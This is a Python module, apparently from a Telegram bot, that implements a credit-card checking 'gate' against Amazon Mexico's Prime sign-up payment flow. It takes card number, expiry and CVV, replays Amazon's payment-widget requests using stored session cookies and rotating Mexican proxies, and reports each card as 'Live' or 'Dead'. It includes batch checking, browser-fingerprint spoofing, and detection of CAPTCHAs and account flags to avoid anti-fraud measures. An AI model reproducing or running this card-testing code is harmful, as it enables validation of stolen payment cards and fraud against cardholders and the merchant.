from __future__ import annotations

import asyncio
import html
import json
import logging
import os
import re
import time
from pathlib import Path
from typing import Callable, Dict, List, Optional, Tuple

import requests

from bot.config import GATE_PROXIES_MX, AMAZON_ACCOUNT_HOLDER_NAME
from bot.services.amazon_cookies import get_amazon_cookie

logger = logging.getLogger(__name__)


def _pick_mx_proxy() -> Optional[dict]:
    if not GATE_PROXIES_MX:
        return None
    proxy_url = requests.utils.get_environ_proxies("http://example.com").get("http") or None
    import random
    proxy_url = random.choice(GATE_PROXIES_MX)
    return {"http": proxy_url, "https": proxy_url}


                                                                             
                                   
                                                                             
                                                                             
                                                                         
                                                                             
                                           
_AMAZON_PRIME_URL = (
    "https://www.amazon.com.mx/hp/wlp/pipeline/membersignup"
    "?campaignId=SlashPrime"
)

                                                                                      
_AMAZON_VERIFY_URL = "https://www.amazon.com.mx/gp/yourstore/home"

_HEADERS_BASE = {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "es-MX,es;q=0.9,en;q=0.8",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36",
    "device-memory": "8",
    "downlink": "1.5",
    "dpr": "1",
    "ect": "4g",
    "referer": "https://www.amazon.com.mx/amazonprime?ref_=nav_cs_primelink_nonmember",
    "rtt": "100",
    "sec-ch-device-memory": "8",
    "sec-ch-dpr": "1",
    "sec-ch-ua": '"Chromium";v="152", "Not?A_Brand";v="24", "Google Chrome";v="152"',
    "sec-ch-ua-full-version-list": '"Chromium";v="152.0.7977.65", "Not?A_Brand";v="24.0.0.0", "Google Chrome";v="152.0.7977.65"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-ch-ua-platform-version": "19.0.0",
    "sec-ch-viewport-width": "891",
    "upgrade-insecure-requests": "1",
    "viewport-width": "891",
}

                                                                             
            
                                                                             
def _get_cookie(user_id: Optional[int] = None) -> Optional[str]:
                                                                                      
                                                                  
    cookie = os.getenv("AMAZON_COOKIE", "").strip()
    if cookie:
        return cookie
    path = Path("data/amazon_cookie.txt")
    if path.exists():
        text = path.read_text(encoding="utf-8").strip()
        if text:
            return text
    return None


async def _get_cookie_for_user(user_id: int) -> Optional[str]:
    user_cookie = await get_amazon_cookie(user_id)
    if user_cookie:
        return user_cookie
    return _get_cookie()


def _debug_save_response(step: str, response, cookie: str) -> None:
    try:
        debug_dir = Path("data/amazon_debug")
        debug_dir.mkdir(parents=True, exist_ok=True)
        timestamp = int(time.time())
        file_path = debug_dir / f"{step}_{timestamp}.txt"

        text = response.text if hasattr(response, "text") else str(response)
                                                
        for part in cookie.split(";"):
            part = part.strip()
            if "=" in part:
                key, value = part.split("=", 1)
                if value and len(value) > 4:
                    text = text.replace(value, f"<REDACTED:{key.strip()}>")

        headers = getattr(response, "headers", {})
        safe_headers = {k: v for k, v in headers.items() if k.lower() not in ("set-cookie", "cookie")}

        content = (
            f"STEP: {step}\n"
            f"STATUS: {getattr(response, 'status_code', 'N/A')}\n"
            f"URL: {getattr(response, 'url', 'N/A')}\n"
            f"TIME_ELAPSED: {getattr(response, 'elapsed', 'N/A')}\n"
            f"HEADERS: {safe_headers}\n"
            f"--- BODY ---\n{text[:50000]}\n"
        )
        file_path.write_text(content, encoding="utf-8")
    except Exception:
        pass


def _debug_save_payload(step: str, payload: Dict[str, str], cookie: str) -> None:
    try:
        debug_dir = Path("data/amazon_debug")
        debug_dir.mkdir(parents=True, exist_ok=True)
        timestamp = int(time.time())
        file_path = debug_dir / f"{step}_payload_{timestamp}.json"
        safe_payload = {k: v for k, v in payload.items()}
        safe_payload["_cookie_keys"] = [p.strip().split("=")[0] for p in cookie.split(";") if "=" in p]
        file_path.write_text(json.dumps(safe_payload, indent=2), encoding="utf-8")
    except Exception:
        pass


def _extract_amazon_error(response_text: str) -> Optional[str]:
                                                                            
    visible_patterns = [
        r'Superaste el máximo de intentos permitidos[^<]*',
        r'vuelve a intentarlo después de \d+ horas[^<]*',
        r'no podrás agregar una tarjeta por los siguientes \d+ minutos[^<]*',
        r'no podrás agregar una tarjeta por las siguientes \d+ horas[^<]*',
        r'Contactar con servicio al cliente[^<]*',
    ]
    for pattern in visible_patterns:
        match = re.search(pattern, response_text, re.IGNORECASE)
        if match:
            return re.sub(r'\s+', ' ', match.group(0).strip())
    patterns = [
        r'"errorMessage"\s*:\s*"([^"]*)"',
        r'"error_title"\s*[^>]*>([^<]+)',
        r'"errorMessage"\s*>([^<]+)',
        r'class="a-alert-heading"[^>]*>([^<]+)',
        r'<h4[^>]*class="[^"]*a-alert-heading[^"]*"[^>]*>([^<]+)',
        r'data-a-expander-name="cvv_errors"[^>]*>.*?<span[^>]*>([^<]+)</span>',
        r'id="cvv_errors"[^>]*>.*?<span[^>]*>([^<]+)</span>',
    ]
    for pattern in patterns:
        match = re.search(pattern, response_text, re.DOTALL | re.IGNORECASE)
        if match:
            return re.sub(r'\s+', ' ', match.group(1).strip())
    return None


def _extract_decline_reason(response_text: str) -> Optional[str]:
    text_lower = response_text.lower()
    keywords = [
        ("superaste el maximo de intentos permitidos", "Cuenta en rate limit de Amazon"),
        ("no podras agregar una tarjeta", "Cuenta bloqueada temporalmente por Amazon"),
        ("fondos insuficientes", "Fondos insuficientes"),
        ("insufficient funds", "Fondos insuficientes"),
        ("declinada por el banco", "Declinada por el banco"),
        ("declined by bank", "Declinada por el banco"),
        ("tarjeta invalida", "Tarjeta invalida"),
        ("invalid card", "Tarjeta invalida"),
        ("numero de tarjeta incorrecto", "Numero de tarjeta incorrecto"),
        ("incorrect card number", "Numero de tarjeta incorrecto"),
        ("fecha de vencimiento invalida", "Fecha de vencimiento invalida"),
        ("invalid expiration date", "Fecha de vencimiento invalida"),
        ("cvv incorrecto", "CVV incorrecto"),
        ("incorrect cvv", "CVV incorrecto"),
        ("no se pudo verificar el metodo de pago", "No se pudo verificar el metodo de pago"),
        ("unable to verify payment method", "No se pudo verificar el metodo de pago"),
        ("supero el limite", "Supero el limite de la tarjeta"),
        ("over the limit", "Supero el limite de la tarjeta"),
        ("rechazada", "Tarjeta rechazada"),
        ("rejected", "Tarjeta rechazada"),
    ]
    for keyword, reason in keywords:
        if keyword in text_lower:
            return reason
                                         
    alert = _extract_amazon_error(response_text)
    if alert:
        return alert
    return None


def _validate_card(card_data: str) -> Optional[Tuple[str, str, str, str]]:
    parts = card_data.split("|")
    if len(parts) != 4:
        return None
    cc, mes, ano, cvv = (p.strip() for p in parts)

    if not cc.isdigit() or len(cc) < 13 or len(cc) > 19:
        return None
    if not mes.isdigit() or not (1 <= int(mes) <= 12):
        return None
    if not ano.isdigit():
        return None
    if len(ano) == 4:
        ano = ano[-2:]
    if not (0 <= int(ano) <= 99):
        return None
    if not cvv.isdigit() or len(cvv) < 3 or len(cvv) > 4:
        return None

    return cc, mes, ano, cvv


def _format_card(cc: str) -> str:
    return " ".join(cc[i : i + 4] for i in range(0, len(cc), 4))


def _verify_cookie(session: requests.Session, cookie: str) -> Tuple[bool, str, str]:
    headers = {**_HEADERS_BASE, "cookie": cookie}
    try:
                                                                      
        response = session.get(_AMAZON_VERIFY_URL, headers=headers, timeout=20)
    except requests.exceptions.RequestException as exc:
        logger.error("Amazon gate verify: error de conexion -> %s", exc)
        return False, "network_error", f"Error de conexion: {exc}"

    logger.info("Amazon gate verify: status=%s url=%s", response.status_code, response.url)
    _debug_save_response("verify_cookie", response, cookie)

    text = response.text
    text_lower = text.lower()

    if response.status_code == 401:
        return False, "expired", "Cookie expirada (401)."

    if response.status_code != 200:
        return False, "unknown", f"Amazon respondio status {response.status_code}. La cookie puede estar bloqueada o el endpoint cambio."

    captcha_markers = (
        "try different image",
        "please prove",
        "escribe los caracteres",
        "ingresa los caracteres",
        "introduce los caracteres",
    )
    if any(m in text_lower for m in captcha_markers):
        return False, "captcha", "CAPTCHA detectado. La IP/proxy o la cuenta estan siendo cuestionadas."

                                                                       
                                                                  
    customer_id_match = (
        re.search(r'"customerID"\s*:\s*"([^"]+)"', text)
        or re.search(r'customerId\s*:\s*["\']([^"\']+)["\']', text, re.IGNORECASE)
    )
    customer_id = customer_id_match.group(1) if customer_id_match else ""
    if re.fullmatch(r"[A-Z0-9]{10,}", customer_id or ""):
        return True, "valid", "Cookie válida (sesión activa en Amazon)."

                                                                 
    if ("hola, identifícate" in text_lower or "hola, identificate" in text_lower
            or "hello, sign in" in text_lower):
        return False, "expired", "Cookie expirada: Amazon muestra la página sin sesión."

                                                                       
                                       
    if "signin" in response.url:
        return False, "expired", "Cookie expirada: Amazon redirigio a login."
    if "/ax/claim" in response.url:
        return False, "verification_required", "Amazon solicito verificacion de cuenta (/ax/claim). La cookie esta en riesgo o la IP/proxy esta flaggeada."
    if "suspendida" in text_lower or "suspended" in text_lower or "deshabilitada" in text_lower:
        return False, "suspended", "Cuenta suspendida por Amazon."
                                                                         
    logger.info("Amazon gate verify: sin señales de cierre de sesión, asumiendo valida")
    return True, "valid", "Cookie válida (home accesible)."


def _process_card(
    session: requests.Session,
    card_tuple: Tuple[str, str, str, str],
    card_index: int,
    cookie: str,
    proxies: Optional[dict] = None,
) -> Dict[str, str]:
    cc_number, month, year, cvv = card_tuple
    card_display = _format_card(cc_number)
    card_masked = f"{cc_number[:6]}******{cc_number[-4:]}"

                                                            
    if len(year) == 2:
        year_full = "20" + year
    else:
        year_full = year
    month_padded = month.zfill(2)

    headers = {**_HEADERS_BASE, "cookie": cookie}
    logger.info("Amazon gate: procesando tarjeta %s (#%d)", card_masked, card_index)

                                     
    if proxies is None:
        proxies = _pick_mx_proxy()

    try:
                                             
        logger.info("Amazon gate: step1 GET %s", _AMAZON_PRIME_URL)
        response = session.get(_AMAZON_PRIME_URL, headers=headers, proxies=proxies, timeout=20)
        _debug_save_response("step1_init", response, cookie)
        logger.info("Amazon gate: step1 status=%s url=%s", response.status_code, response.url)

        if response.status_code == 401:
            return {"status": "⚠️ Error", "message": "Cookie expirada (401) en step1."}
        if response.status_code != 200:
            return {"status": "⚠️ Error", "message": f"Step1 fallo con status {response.status_code}."}

                                                                       
                                                                                
        step1_text = _clean_html(response.text)
        widgetstate_match = re.search(r'name="ppw-widgetState" value="(.*?)"', step1_text)
        customer_id_match = re.search(r'"customerID":\s*"([^"]+)"', step1_text)
        if not widgetstate_match or not customer_id_match:
            text_lower = response.text.lower()
            if "signin" in response.url or "ap/signin" in text_lower:
                return {"status": "⚠️ Error", "message": "Prime pidió iniciar sesión de nuevo. Usa una sesión fresca: cuenta recién creada con /gencookie y su botón Verificar tarjeta.", "classification": "expired"}
            if "/ax/claim" in response.url:
                return {
                    "status": "⚠️ Error",
                    "message": "Amazon puso esta cuenta en revisión y Prime no deja pasar ahorita. "
                    "Entra a amazon.com.mx en tu navegador y completa lo que pida, o verifica "
                    "con la sesión fresca de una cuenta recién creada con /gencookie.",
                    "classification": "verification_required",
                }
            return {"status": "⚠️ Error", "message": "Amazon cambió la página de Prime y no se pudo leer. Intenta más tarde."}

        initial_widgetstate = widgetstate_match.group(1)
        customer_id = customer_id_match.group(1)

                                     
        headers_post = {
            **headers,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "content-type": "application/x-www-form-urlencoded",
            "host": "apx-security.amazon.com.mx",
        }
        payload = {
            "widgetState": initial_widgetstate,
            "clientId": "Subs:Prime",
            "creatablePaymentMethods": "CC",
        }
        _debug_save_payload("step2_register", payload, cookie)
        logger.info("Amazon gate: step2 POST register")
        register_response = session.post(
            "https://apx-security.amazon.com.mx/cpe/pm/register",
            headers=headers_post,
            data=payload,
            proxies=proxies,
            timeout=20,
        )
        _debug_save_response("step2_register", register_response, cookie)
        logger.info("Amazon gate: step2 status=%s", register_response.status_code)
        if register_response.status_code == 401:
            return {"status": "⚠️ Error", "message": "Cookie expirada (401) en step2 (register)."}
        if register_response.status_code != 200:
            return {"status": "⚠️ Error", "message": f"Step2 fallo con status {register_response.status_code}. Revisar data/amazon_debug/step2_register_*.txt"}

        new_widgetstate_match = re.search(
            r'name="ppw-widgetState" value="(.*?)"', _clean_html(register_response.text)
        )
        if not new_widgetstate_match:
            error_msg = _extract_amazon_error(register_response.text)
            detail = f" Amazon dice: {error_msg}" if error_msg else ""
            return {"status": "⚠️ Error", "message": f"Step2: no se obtuvo nuevo widgetState.{detail} Revisar data/amazon_debug/step2_register_*.txt"}
        new_widgetstate = new_widgetstate_match.group(1)

                                             
                                                                                                
        headers3 = {
            **headers,
            "accept": "application/json, text/javascript, */*; q=0.01",
            "apx-widget-info": "Subs:Prime/desktop",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "host": "apx-security.amazon.com.mx",
            "origin": "https://apx-security.amazon.com.mx",
            "referer": "https://apx-security.amazon.com.mx/cpe/pm/register",
        }
        payload3 = {
            "ppw-jsEnabled": "true",
            "addCreditCardNumber": card_display,
            "ppw-widgetEvent": "IdentifyCreditCardEvent",
            "ppw-widgetState": new_widgetstate,
        }
        continue_url = (
            f"https://apx-security.amazon.com.mx/payments-portal/data/widgets2/v1/customer/{customer_id}/continueWidget"
        )
        _debug_save_payload("step3_identify", payload3, cookie)
        logger.info("Amazon gate: step3 POST identify")
        continue_response = session.post(continue_url, headers=headers3, data=payload3, proxies=proxies, timeout=20)
        _debug_save_response("step3_identify", continue_response, cookie)
        logger.info("Amazon gate: step3 status=%s", continue_response.status_code)
        if continue_response.status_code == 401:
            return {"status": "⚠️ Error", "message": "Cookie expirada (401) en step3 (identify)."}
                                                                                        
                                                                    
        if continue_response.status_code == 400:
            latest_widgetstate = new_widgetstate
            logger.info("Amazon gate: step3 devolvio 400, continuando con widgetState anterior")
        elif continue_response.status_code != 200:
            return {"status": "⚠️ Error", "message": f"Step3 fallo con status {continue_response.status_code}. Revisar data/amazon_debug/step3_identify_*.txt"}
        else:
                                                     
            widgetstate_match4 = re.search(r'"widgetState"\s*:\s*"([^"]*)"', continue_response.text)
            latest_widgetstate = widgetstate_match4.group(1) if widgetstate_match4 else new_widgetstate

                                              
        headers4 = {**headers3, "apx-widget-info": "Subs:Prime/desktop"}
        payload4 = {
            "ppw-widgetEvent": "AddCreditCardEvent",
            "ppw-jsEnabled": "true",
            "ppw-widgetState": latest_widgetstate,
            "ie": "UTF-8",
            "ppw-accountHolderName": AMAZON_ACCOUNT_HOLDER_NAME,
            "addCreditCardNumber": card_display,
            "ppw-expirationDate_month": month_padded,
            "ppw-expirationDate_year": year_full,
            "addCreditCardVerificationNumber": cvv,
            "ppw-addCreditCardVerificationNumber_isRequired": "true",
            "__sif_encrypted_hba_account_holder_name": AMAZON_ACCOUNT_HOLDER_NAME,
            "ppw-issuer": "Unknown",
        }
        register_url4 = (
            f"https://apx-security.amazon.com.mx/payments-portal/data/widgets2/v1/customer/{customer_id}/continueWidget"
            "?sif_profile=APX-Encrypt-All-NA"
        )
        _debug_save_payload("step4_addcard", payload4, cookie)
        logger.info("Amazon gate: step4 POST addcard")
        register_response4 = session.post(register_url4, headers=headers4, data=payload4, proxies=proxies, timeout=20)
        _debug_save_response("step4_addcard", register_response4, cookie)
        logger.info("Amazon gate: step4 status=%s", register_response4.status_code)
        if register_response4.status_code == 401:
            return {"status": "⚠️ Error", "message": "Cookie expirada (401) en step4 (addcard)."}
        if register_response4.status_code != 200:
            return {"status": "⚠️ Error", "message": f"Step4 fallo con status {register_response4.status_code}. Revisar data/amazon_debug/step4_addcard_*.txt"}

        try:
            response_json = register_response4.json()
        except Exception as exc:
            logger.error("Amazon gate: step4 no devolvio JSON -> %s", exc)
            return {"status": "⚠️ Error", "message": f"Step4 no devolvio JSON valido: {exc}. Revisar data/amazon_debug/step4_addcard_*.txt"}

        auth_source_id = (
            response_json.get("additionalWidgetResponseData", {})
            .get("additionalData", {})
            .get("authenticationSourceId")
        )
        if not auth_source_id:
            error_msg = _extract_amazon_error(register_response4.text)
            detail = f" Amazon dice: {error_msg}" if error_msg else ""
            return {
                "status": "⚠️ Error",
                "message": f"Step4: no se obtuvo authenticationSourceId.{detail} Revisar data/amazon_debug/step4_addcard_*.txt",
            }

        html_content = response_json.get("htmlContent", "")

                                                                                             
        options_match = re.search(r'var options = ({.*?});', html_content, re.DOTALL)
        if not options_match:
            return {"status": "⚠️ Error", "message": "Step4: objeto options no encontrado. Revisar data/amazon_debug/step4_addcard_*.txt"}
        options_text = options_match.group(1)
                                                                                                                      
        serialized_match = re.search(
            r'"testAjaxAuthenticationRequired"\s*:\s*"false"\s*,\s*"clientId"\s*:\s*"Subs:Prime"\s*,\s*"serializedState"\s*:\s*"([^"]*)"',
            options_text,
        )
        if not serialized_match:
                                                   
            serialized_match = re.search(r'"serializedState"\s*:\s*"([^"]*)"', options_text)
        if not serialized_match:
            return {"status": "⚠️ Error", "message": "Step4: serializedState no encontrado. Revisar data/amazon_debug/step4_addcard_*.txt"}
        serialized_state = serialized_match.group(1)

                                             
        headers5 = {**headers4}
        payload5 = {
            "ppw-jsEnabled": "true",
            "ppw-widgetEvent": "CVVAuthenticateEvent",
            "ppw-widgetState": serialized_state,
            "ppw-authenticationSourceId": auth_source_id,
        }
        _debug_save_payload("step5_verify", payload5, cookie)
        logger.info("Amazon gate: step5 POST verify CVV")
        verify_response = session.post(continue_url, headers=headers5, data=payload5, proxies=proxies, timeout=20)
        _debug_save_response("step5_verify", verify_response, cookie)
        logger.info("Amazon gate: step5 status=%s", verify_response.status_code)
        if verify_response.status_code == 401:
            return {"status": "⚠️ Error", "message": "Cookie expirada (401) en step5 (verify)."}
        if verify_response.status_code != 200:
            return {"status": "⚠️ Error", "message": f"Step5 fallo con status {verify_response.status_code}. Revisar data/amazon_debug/step5_verify_*.txt"}

        try:
            verify_json = verify_response.json()
        except Exception as exc:
            logger.error("Amazon gate: step5 no devolvio JSON -> %s", exc)
            return {"status": "⚠️ Error", "message": f"Step5 no devolvio JSON valido: {exc}. Revisar data/amazon_debug/step5_verify_*.txt"}

        if "additionalWidgetResponseData" not in verify_json:
            return {"status": "⚠️ Error", "message": "Step5: respuesta incompleta. Revisar data/amazon_debug/step5_verify_*.txt"}

        additional_data = verify_json["additionalWidgetResponseData"].get("additionalData", {})
        status = additional_data.get("status", "Unknown")

                                                                                          
        attempts = 0
        max_attempts = 4
        last_response_text = verify_response.text
        while status == "PENDING" and attempts < max_attempts:
            attempts += 1
            time.sleep(3)
            logger.info("Amazon gate: reintento %d por status PENDING", attempts)
            retry_response = session.post(continue_url, headers=headers5, data=payload5, timeout=20)
            _debug_save_response(f"step5_retry_{attempts}", retry_response, cookie)
            logger.info("Amazon gate: retry %d status=%s", attempts, retry_response.status_code)
            try:
                retry_json = retry_response.json()
                if "additionalWidgetResponseData" in retry_json:
                    status = (
                        retry_json["additionalWidgetResponseData"]
                        .get("additionalData", {})
                        .get("status", "Unknown")
                    )
                    last_response_text = retry_response.text
                    if status != "PENDING":
                        break
            except Exception as exc:
                logger.warning("Amazon gate: retry %d no devolvio JSON -> %s", attempts, exc)

        logger.info("Amazon gate: resultado final para %s -> status=%s", card_masked, status)
        if status == "APPROVED":
            return {"status": "✅ Live", "message": f"Amazon aprobo la tarjeta ({card_display})"}
        if status == "DECLINED":
            reason = _extract_decline_reason(last_response_text)
            if reason:
                return {"status": "❌ Dead", "message": f"Tarjeta declinada: {reason}."}
            return {"status": "❌ Dead", "message": "Tarjeta declinada por Amazon."}
        if status == "PENDING":
            return {"status": "❌ Dead", "message": "Verificacion pendiente: Amazon no respondio aprobacion/rechazo."}
        return {"status": "⚠️ Error", "message": f"Estado desconocido: {status}"}

    except requests.exceptions.RequestException as exc:
        logger.error("Amazon gate: error de red para %s -> %s", card_masked, exc)
        if "401" in str(exc):
            return {"status": "⚠️ Error", "message": "Cookie expirada o cuenta bloqueada (401)."}
        return {"status": "⚠️ Error", "message": f"Error de red: {exc}"}
    except Exception as exc:
        logger.exception("Error inesperado en Amazon gate: %s", exc)
        return {"status": "⚠️ Error", "message": "Error interno al procesar la tarjeta."}


                                                                             
                   
                                                                             
async def amazon_check_cookie(user_id: Optional[int] = None) -> Dict[str, str]:
    cookie = await _get_cookie_for_user(user_id)
    cookie_source = "usuario" if user_id and await get_amazon_cookie(user_id) else "global"
    logger.info("Amazon gate: check_cookie user_id=%s cookie_source=%s", user_id, cookie_source)
    if not cookie:
        return {"status": "⚠️ Error", "message": "No hay cookie de Amazon configurada. Guardala con /save <cookie> o /save respondiendo a un mensaje con la cookie."}

    loop = asyncio.get_event_loop()

    def _run() -> Dict[str, str]:
        session = requests.Session()
        ok, classification, msg = _verify_cookie(session, cookie)
        if not ok:
            status_emoji = "⚠️ Error"
            if classification == "expired":
                status_emoji = "❌ Expirada"
            elif classification == "suspended":
                status_emoji = "🚫 Suspendida"
            elif classification == "verification_required":
                status_emoji = "🔒 Verificacion"
            elif classification == "captcha":
                status_emoji = "🤖 CAPTCHA"
            return {"status": status_emoji, "message": msg, "classification": classification}
        return {"status": "✅ Live", "message": f"Cookie valida ({cookie_source}).", "classification": "valid"}

    return await loop.run_in_executor(None, _run)


def _clean_html(text: str) -> str:
    for _ in range(3):
        decoded = html.unescape(text)
        if decoded == text:
            break
        text = decoded
    return text


                                                                     
                                         
                                                                            
                                                                          
                                                                            
                                                                        
_VERIFY_TTL_S = 300
_verify_ok_until: Dict[int, float] = {}


def _session_verified_recently(user_id: Optional[int]) -> bool:
    if user_id is None:
        return False
    return time.time() < _verify_ok_until.get(user_id, 0)


def _mark_session_verified(user_id: Optional[int]) -> None:
    if user_id is not None:
        _verify_ok_until[user_id] = time.time() + _VERIFY_TTL_S


def _forget_session_verified(user_id: Optional[int]) -> None:
    _verify_ok_until.pop(user_id, None)


def _is_session_failure(result: Dict[str, str]) -> bool:
    return result.get("status") not in ("✅ Live", "❌ Dead")


def _merge_cookie_string(stored: str, fresh: Dict[str, str]) -> str:
    pairs: Dict[str, str] = {}
    order: List[str] = []
    for part in stored.split(";"):
        part = part.strip()
        if not part or "=" not in part:
            continue
        key, value = part.split("=", 1)
        key = key.strip()
        if not key or key in pairs:
            continue
        pairs[key] = value.strip()
        order.append(key)
    for key, value in fresh.items():
        if key not in pairs:
            order.append(key)
        pairs[key] = value
    return "; ".join(f"{key}={pairs[key]}" for key in order)


async def amazon_refresh_cookie(user_id: Optional[int] = None) -> Dict[str, object]:
    cookie = await _get_cookie_for_user(user_id) if user_id else _get_cookie()
    if not cookie:
        return {
            "status": "⚠️ Error",
            "message": "No tienes cookies guardadas para exportar. Genera una cuenta con /gencookie o guarda una con /save.",
            "classification": "missing",
            "refreshed": False,
        }

    loop = asyncio.get_running_loop()

    def _run() -> Dict[str, object]:
        session = requests.Session()
        try:
            headers = {**_HEADERS_BASE, "cookie": cookie}
            try:
                session.get(_AMAZON_VERIFY_URL, headers=headers, timeout=20)
            except requests.exceptions.RequestException as exc:
                logger.error("Amazon refresh: error de red -> %s", exc)
                return {
                    "status": "⚠️ Error",
                    "message": "No se pudo contactar a Amazon para refrescar. Intenta de nuevo en unos minutos.",
                    "classification": "network_error",
                    "refreshed": False,
                }
            fresh = {c.name: c.value for c in session.cookies}
            merged = _merge_cookie_string(cookie, fresh) if fresh else cookie
            ok, classification, msg = _verify_cookie(session, merged)
            if not ok:
                status_emoji = "⚠️ Error"
                if classification == "expired":
                    status_emoji = "❌ Expirada"
                elif classification == "suspended":
                    status_emoji = "🚫 Suspendida"
                elif classification == "verification_required":
                    status_emoji = "🔒 Verificacion"
                elif classification == "captcha":
                    status_emoji = "🤖 CAPTCHA"
                return {
                    "status": status_emoji,
                    "message": msg,
                    "classification": classification,
                    "refreshed": False,
                }
            return {
                "status": "✅ Live",
                "message": msg,
                "classification": "valid",
                "refreshed": merged != cookie,
                "cookie": merged,
            }
        finally:
            session.close()

    result = await loop.run_in_executor(None, _run)
                                                                        
                                                                       
    return result


async def amazon_check(
    card_data: str,
    user_id: Optional[int] = None,
    cookie: Optional[str] = None,
) -> Dict[str, str]:
    cookie_source = "directa"
    if not cookie:
        cookie = await _get_cookie_for_user(user_id)
        cookie_source = "usuario" if user_id and await get_amazon_cookie(user_id) else "global"
    logger.info("Amazon gate: inicio check user_id=%s cookie_source=%s", user_id, cookie_source)
    if not cookie:
        return {"status": "⚠️ Error", "message": "No hay cookie de Amazon configurada. Guardala con /save <cookie> o /save respondiendo a un mensaje con la cookie."}

    card_tuple = _validate_card(card_data)
    if not card_tuple:
        return {"status": "❌ Dead", "message": "Formato invalido. Usa cc|mes|año|cvv"}

    loop = asyncio.get_event_loop()

    def _run() -> Dict[str, str]:
        session = requests.Session()
        if not _session_verified_recently(user_id):
            ok, classification, msg = _verify_cookie(session, cookie)
            if not ok:
                logger.warning("Amazon gate: validacion de cookie fallo -> %s (%s)", msg, classification)
                status_emoji = "⚠️ Error"
                if classification == "expired":
                    status_emoji = "❌ Expirada"
                elif classification == "suspended":
                    status_emoji = "🚫 Suspendida"
                elif classification == "verification_required":
                    status_emoji = "🔒 Verificacion"
                elif classification == "captcha":
                    status_emoji = "🤖 CAPTCHA"
                return {"status": status_emoji, "message": msg, "classification": classification}
            _mark_session_verified(user_id)
        result = _process_card(session, card_tuple, 1, cookie, _pick_mx_proxy())
        if _is_session_failure(result):
            _forget_session_verified(user_id)
        return result

    return await loop.run_in_executor(None, _run)


async def amazon_check_multiple(
    cards_data: List[str],
    callback: Optional[Callable[[int, Dict[str, str], str, int], None]] = None,
    user_id: Optional[int] = None,
) -> List[Dict[str, str]]:
    cookie = await _get_cookie_for_user(user_id)
    cookie_source = "usuario" if user_id and await get_amazon_cookie(user_id) else "global"
    logger.info("Amazon gate: inicio mass user_id=%s cookie_source=%s total_cards=%d", user_id, cookie_source, len(cards_data))
    cards = [c.strip() for c in cards_data if c.strip()][:10]
    total = len(cards)
    results: List[Dict[str, str]] = []

    if total == 0:
        return []

    if not cookie:
        error = {"status": "⚠️ Error", "message": "No hay cookie de Amazon configurada. Guardala con /save <cookie> o /save respondiendo a un mensaje con la cookie."}
        results = [error] * total
        if callback:
            for i, card in enumerate(cards):
                await callback(i, error, card, 0)
        return results

    loop = asyncio.get_event_loop()

    classification = "valid"
    msg = ""
    if not _session_verified_recently(user_id):
        def _verify_cookie_once() -> Tuple[str, str]:
            session = requests.Session()
            ok, classification, msg = _verify_cookie(session, cookie)
            return classification, msg

        classification = "unknown"
        msg = "Error desconocido"
        try:
            classification, msg = await loop.run_in_executor(None, _verify_cookie_once)
        except Exception as exc:
            msg = str(exc)

        if classification != "valid":
            status_emoji = "⚠️ Error"
            if classification == "expired":
                status_emoji = "❌ Expirada"
            elif classification == "suspended":
                status_emoji = "🚫 Suspendida"
            elif classification == "verification_required":
                status_emoji = "🔒 Verificacion"
            elif classification == "captcha":
                status_emoji = "🤖 CAPTCHA"
            error = {"status": status_emoji, "message": msg, "classification": classification}
            results = [error] * total
            if callback:
                for i, card in enumerate(cards):
                    await callback(i, error, card, 0)
            return results
        _mark_session_verified(user_id)

                                            
    shared_proxies = _pick_mx_proxy()

    for i, card_data in enumerate(cards):
        card_tuple = _validate_card(card_data)
        if not card_tuple:
            result = {"status": "❌ Dead", "message": "Formato inválido"}
        else:

            def _run_one(card_tuple=card_tuple, index=i + 1) -> Dict[str, str]:
                session = requests.Session()
                return _process_card(session, card_tuple, index, cookie, shared_proxies)

            result = await loop.run_in_executor(None, _run_one)
        results.append(result)

        if callback:
            try:
                await callback(i, result, card_data, 0)
            except Exception:
                logger.exception("Error en callback de Amazon mass")

        if _is_session_failure(result):
                                                                            
                                                                     
            logger.warning(
                "Amazon mass: sesión marcada (%s), deteniendo lote en %d/%d",
                result.get("status"), i + 1, total,
            )
            _forget_session_verified(user_id)
            stopped = dict(result)
            stopped["message"] = "Lote detenido para cuidar la sesión. " + result.get("message", "")
            for j in range(i + 1, total):
                results.append(stopped)
                if callback:
                    try:
                        await callback(j, stopped, cards[j], 0)
                    except Exception:
                        logger.exception("Error en callback de Amazon mass")
            break

        if i < total - 1:
            await asyncio.sleep(7)

    return results
